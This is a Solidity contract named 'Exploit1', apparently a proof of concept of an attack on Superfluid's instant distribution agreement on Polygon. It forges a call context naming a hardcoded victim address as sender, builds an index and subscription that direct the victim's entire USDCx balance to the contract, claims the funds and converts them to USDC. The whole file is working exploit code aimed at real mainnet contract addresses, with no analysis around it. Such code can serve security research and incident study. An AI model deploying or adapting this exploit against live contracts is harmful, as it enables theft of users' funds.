// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "src/Common.sol";

interface IIDA is ISuperAgreement {
    function createIndex(ISuperToken token, uint32 indexId, bytes calldata ctx) external returns(bytes memory newCtx);
    function getIndex(ISuperToken token, address publisher, uint32 indexId) external view returns(bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);
    function updateIndex(ISuperToken token, uint32 indexId, uint128 indexValue, bytes calldata ctx) external returns(bytes memory newCtx);
    function updateSubscription(ISuperToken token, uint32 indexId, address subscriber, uint128 units, bytes calldata ctx) external returns (bytes memory newCtx);
    function claim(ISuperToken token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx) external returns(bytes memory newCtx);
}

contract Exploit1 {

    ISuperfluid superfluid;
    IIDA ida;
    ISuperToken usdcx;
    IERC20 usdc;
    bytes32 _ctxStamp;
    address victim;

    event StealUdsc(uint256 amount);

    constructor() {
        superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
        ida = IIDA(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
        usdcx = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
        usdc = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    }

    function serializeContext(Context memory context)
        private
        returns (bytes memory ctx)
    {
        uint256 callInfo = ContextDefinitions.encodeCallInfo(context.appCallbackLevel, context.callType);
        uint256 creditIO =
            uint128(context.appCreditGranted) |
            (uint256(uint128(context.appCreditWantedDeprecated)) << 128);
        // NOTE: nested encoding done due to stack too deep error when decoding in _decodeCtx
        ctx = abi.encode(
            abi.encode(
                callInfo,
                context.timestamp,
                context.msgSender,
                context.agreementSelector,
                context.userData
            ),
            abi.encode(
                creditIO,
                context.appCreditUsed,
                context.appAddress,
                context.appCreditToken
            )
        );
        _ctxStamp = keccak256(ctx);
    }

    function fakeCtx(bytes memory userData) internal returns (bytes memory) {
        Context memory ctx;
        ctx.callType = ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT;
        ctx.timestamp = block.timestamp;
        ctx.msgSender = victim; //victim addrses
        ctx.appCreditToken = usdcx;
        ctx.userData = userData;
        return serializeContext(ctx);
    }

    function fire() public {
        bytes memory userData = "";
        victim = address(0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188);
        bytes memory callData = fakeCtx(userData);
    
        // create Index
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.createIndex.selector, usdcx, 1234, callData, ""),
            userData
        );
        // update subscription
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.updateSubscription.selector, usdcx, 1234, address(this), 1, callData, ""),
            userData
        );
        // update index
        uint256 unit = usdcx.balanceOf(victim);
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.updateIndex.selector, usdcx, 1234, unit, callData, ""),
            userData
        );
        // steal USDCx with claim
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.claim.selector, usdcx, victim, 1234, address(this), ""),
            userData
        );

        uint256 usdcx_profit = usdcx.balanceOf(address(this));
        // now, downgrade USDCx to USDC
        usdcx.downgrade(usdcx_profit);

        uint256 usdc_profit = usdc.balanceOf(address(this));
        emit StealUdsc(usdc_profit);

    }
}